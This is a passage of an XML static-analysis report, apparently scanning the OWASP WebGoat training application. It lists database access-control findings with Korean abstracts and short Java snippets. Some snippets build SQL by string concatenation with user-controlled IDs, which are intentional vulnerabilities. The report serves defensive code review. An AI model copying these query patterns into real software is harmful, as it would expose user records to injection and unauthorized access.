    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7FB8F14399E2F105E24ACF45830779CC" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>274</LineStart>
<Snippet>		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="45C5DE1B3842C76A59FC92166E850EBE" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 265 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>265</LineStart>
<Snippet>							" AND employee_id = " + employeeId;
					answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
					answer_results = answer_statement.executeQuery( query );
					authorized = answer_results.first();
				}</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="208FD7F188CF792F010EAB479557DC1B" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorizedForEmployee() 메서드는 공격자가 제어하는 기본 키를 포함하는 313 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>313</LineStart>
<Snippet>						ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				answer_statement.setInt(1, userId);
				answer_statement.setInt(2, employeeId);
				ResultSet answer_results = answer_statement.executeQuery();
				authorized = answer_results.first();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="94F70CC4CA9A594CC36E37ABB63796C4" ruleID="15F02C90-B978-45CA-81B7-A4CE130341FE">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DeleteProfile.java의 deleteEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 115 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>115</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1F3281F354AA0A927BDD27C40593640B" ruleID="264C499A-C0F5-479E-9758-9E8C24468D70">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 UpdateProfile.java의 createEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 340 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>340</LineStart>
<Snippet>		Statement statement = WebSession.getConnection(s)
			.createStatement();
		statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>145</LineStart>
<Snippet>	String ccn = request.getParameter(CrossSiteScripting.CCN);
	int ccnLimit = Integer.parseInt(request
		.getParameter(CrossSiteScripting.CCN_LIMIT));
	String disciplinaryActionDate = request
		.getParameter(CrossSiteScripting.DISCIPLINARY_DATE);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9599B7B1D829DFAA84732AAB3EFB71C3" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 SoapRequest.java의 getResults() 메서드는 공격자가 제어하는 기본 키를 포함하는 419 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>419</LineStart>
<Snippet>	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try
	    {</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SoapRequest.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SoapRequest.java</FilePath>
<LineStart>467</LineStart>
<Snippet>

    public String getLastName(int id)
    {
	String result = getResults(id, "last_name");</Snippet>
<TargetFunction>getLastName(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BB5CCF13B9AD54A3BABD62BDE9AAD00D" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 FindProfile.java의 findEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 177 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>177</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setString(1, "%" + pattern + "%");
		answer_statement.setString(2, "%" + pattern + "%");
		ResultSet answer_results = answer_statement.executeQuery();
</Snippet>
<TargetFunction>java.sql.PreparedStatement.setString()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5B5ECC3A24A1970466B1171D8B870783" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ViewProfile.java의 getEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 132 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3025582889EF3C8D361408D3CF7FDE6D" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 WSDLScanning.java의 getResults() 메서드는 공격자가 제어하는 기본 키를 포함하는 281 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>281</LineStart>
<Snippet>	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try
	    {</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>333</LineStart>
<Snippet>

    public String getLoginCount(int id)
    {
	String result = getResults(id, "login_count");</Snippet>
<TargetFunction>getLoginCount(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DF47FB090AB91C8E8BA94FBE4AC11D1D" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1AA5436E84E5D9E84974487919A6408F" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>274</LineStart>
<Snippet>		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D53E7134EE5E54B1B24336D543B8F9ED" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorizedForEmployee() 메서드는 공격자가 제어하는 기본 키를 포함하는 312 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>312</LineStart>
<Snippet>				PreparedStatement answer_statement = WebSession.getConnection(s).prepareStatement( query, 
						ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				answer_statement.setInt(1, userId);
				answer_statement.setInt(2, employeeId);
				ResultSet answer_results = answer_statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="17C8E091A24E8A40B84818FC3C39E204" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="667659943D38E11A7314F5756F3B6ED4" ruleID="15F02C90-B978-45CA-81B7-A4CE130341FE">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 UpdateProfile.java의 changeEmployeeProfile() 메서드는 공격자가 제어하는 기본 키를 포함하는 248 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>248</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		answer_statement.executeUpdate(query);
	    }
	    catch (SQLException sqle)</Snippet>
<TargetFunction>java.sql.Statement.executeUpdate()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4512DD9149BC62D0B8A01EE7EB83D8CC" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 265 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>265</LineStart>
<Snippet>							" AND employee_id = " + employeeId;
					answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
					answer_results = answer_statement.executeQuery( query );
					authorized = answer_results.first();
				}</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();
		this.context = context;</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1C6CDE763FDFEA73565DE45436C17644" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 265 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>265</LineStart>
<Snippet>							" AND employee_id = " + employeeId;
					answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
					answer_results = answer_statement.executeQuery( query );
					authorized = answer_results.first();
				}</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>274</LineStart>
<Snippet>		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="09C9D75EDC3EDC6FD537B79E8261A9C3" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 265 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>265</LineStart>
<Snippet>							" AND employee_id = " + employeeId;
					answer_statement = WebSession.getConnection(s).createStatement( ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
					answer_results = answer_statement.executeQuery( query );
					authorized = answer_results.first();
				}</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebgoatProperties.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebgoatProperties.java</FilePath>
<LineStart>44</LineStart>
<Snippet>	{
	    FileInputStream in = new FileInputStream(propertiesFileName);
	    load(in);
	}
	catch (IOException e)</Snippet>
<TargetFunction>java.util.Properties.load()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="15B7C5CB26369CFCF35F7A0233481B24" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 ListStaff.java의 getAllEmployees() 메서드는 공격자가 제어하는 기본 키를 포함하는 98 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>271</LineStart>
<Snippet>		enterprise = "true".equals( servlet.getInitParameter( ENTERPRISE ) );
		feedbackAddress = servlet.getInitParameter( FEEDBACK_ADDRESS ) != null ? servlet
				.getInitParameter( FEEDBACK_ADDRESS ) : feedbackAddress;
		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="51BA2F50810D608DEEFF970FBDA420F8" ruleID="A53E6ED8-2131-4F10-B320-4158B7238CFA">
                            <Category>Access Control: Database</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 WSDLScanning.java의 getResults() 메서드는 공격자가 제어하는 기본 키를 포함하는 281 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>281</LineStart>
<Snippet>	    PreparedStatement ps = connection
		    .prepareStatement("SELECT * FROM user_data WHERE userid = ?");
	    ps.setInt(1, id);
	    try
	    {</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>299</LineStart>
<Snippet>

    public String getCreditCard(int id)
    {
	String result = getResults(id, "cc_number");</Snippet>
<TargetFunction>getCreditCard(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CFD20146C1C9D6FE6068BFE7BD52FFA3" ruleID="A43E6C3F-CFD4-4567-B0C9-53B846D644C6">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorizedForEmployee() 메서드는 공격자가 제어하는 기본 키를 포함하는 312 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>312</LineStart>
<Snippet>				PreparedStatement answer_statement = WebSession.getConnection(s).prepareStatement( query, 
						ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY );
				answer_statement.setInt(1, userId);
				answer_statement.setInt(2, employeeId);
				ResultSet answer_results = answer_statement.executeQuery();</Snippet>
<TargetFunction>java.sql.PreparedStatement.setInt()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>274</LineStart>
<Snippet>		showRequest = "true".equals( servlet.getInitParameter( SHOWREQUEST ) );
		isDebug = "true".equals( servlet.getInitParameter( DEBUG ) );
		databaseConnectionString = servlet.getInitParameter( DATABASE_CONNECTION_STRING );
		databaseDriver = servlet.getInitParameter( DATABASE_DRIVER );
		servletName = servlet.getServletName();</Snippet>
<TargetFunction>javax.servlet.GenericServlet.getInitParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4512DD9149BC62D0B8A01EE7EB83D8CB" ruleID="CA09607D-4C9B-49EA-9D6F-55F63801DB7F">
                            <Category>Access Control: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>적절한 access control 없이 DefaultLessonAction.java의 isAuthorized() 메서드는 공격자가 제어하는 기본 키를 포함하는 256 줄의 SQL 문을 실행하면 공격자가 허가 받지 않은 레코드에 접근할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
